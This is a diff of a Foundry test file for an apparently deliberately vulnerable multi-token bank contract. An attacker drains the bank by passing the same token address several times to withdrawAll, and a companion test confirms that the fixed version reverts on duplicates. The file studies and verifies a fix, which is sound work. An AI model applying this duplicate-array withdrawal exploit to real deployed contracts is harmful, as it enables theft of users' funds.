@@ -20,38 +20,65 @@ contract TestDuplicates is Test {
         tokens[0] = address(weth);
 
         vulnerableBank = new VulnerableMultiTokenBank(tokens);
-        weth.mint(address(vulnerableBank), 100e18);
+        weth.mint(address(vulnerableBank), 100 ether);
 
-        // fixedBank = new FixedMultiTokenBank(tokens);
-        // weth.mint(address(fixedBank), 100e18);
+        fixedBank = new FixedMultiTokenBank(tokens);
+        weth.mint(address(fixedBank), 100 ether);
 
-        weth.mint(attacker, 10e18);
+        weth.mint(attacker, 20 ether);
     }
 
     function testWithdrawAllDuplicates() public {
-        console2.log("Before withdraw WETH balance: ", weth.balanceOf(attacker));
-        vm.startPrank(attacker);
+        uint256 vulnerableBankBalanceBefore = weth.balanceOf(address(vulnerableBank));
+        uint256 attackerBalanceBefore = weth.balanceOf(attacker);
 
         // deposit
+        vm.startPrank(attacker);
+        address[] memory tokensToDeposit = new address[](1);
+        tokensToDeposit[0] = address(weth);
+        uint256[] memory amountsToDeposit = new uint256[](1);
+        amountsToDeposit[0] = 20 ether;
+        weth.approve(address(vulnerableBank), 20 ether);
+        vulnerableBank.deposit(amountsToDeposit, tokensToDeposit);
+
+        // withdraw
+        address[] memory tokensToWithdraw = new address[](6);
+        tokensToWithdraw[0] = address(weth);
+        tokensToWithdraw[1] = address(weth);
+        tokensToWithdraw[2] = address(weth);
+        tokensToWithdraw[3] = address(weth);
+        tokensToWithdraw[4] = address(weth);
+        tokensToWithdraw[5] = address(weth);
+        vulnerableBank.withdrawAll(tokensToWithdraw);
+
+        // assert attacker was able to steal 100 ether and get his 20 ether back
+        assertEq(weth.balanceOf(attacker), 120 ether);
+        vm.stopPrank();
+
+        console2.log("VulnerableBank WETH balance before: ", vulnerableBankBalanceBefore);
+        console2.log("Attacker WETH balance before:       ", attackerBalanceBefore);
+        console2.log("VulnerableBank WETH balance after:  ", weth.balanceOf(address(vulnerableBank)));
+        console2.log("Attacker WETH balance after:        ", weth.balanceOf(attacker));
+    }
+
+    function testWithdrawAllDuplicatesFixed() public {
+        // deposit
+        vm.startPrank(attacker);
         address[] memory tokensToDeposit = new address[](1);
         tokensToDeposit[0] = address(weth);
         uint256[] memory amountsToDeposit = new uint256[](1);
         amountsToDeposit[0] = 10e18;
-        weth.approve(address(vulnerableBank), 10e18);
-        vulnerableBank.deposit(amountsToDeposit, tokensToDeposit);
+        weth.approve(address(fixedBank), 10e18);
+        fixedBank.deposit(amountsToDeposit, tokensToDeposit);
 
         // withdraw
         address[] memory tokensToWithdraw = new address[](2);
         tokensToWithdraw[0] = address(weth);
         tokensToWithdraw[1] = address(weth);
-        vulnerableBank.withdrawAll(tokensToWithdraw);
 
-        // assert attacker was able to steal
-        assertEq(weth.balanceOf(attacker), 20e18);
-        console2.log("After withdraw WETH balance: ", weth.balanceOf(attacker));
-
+        // assert that it reverts.
+        vm.expectRevert(FixedMultiTokenBank.ArrayWithDuplicateToken.selector);
+        fixedBank.withdrawAll(tokensToWithdraw);
         vm.stopPrank();
     }
-
-    // function testWithdrawAllDuplicatesFixed() public {}
 }
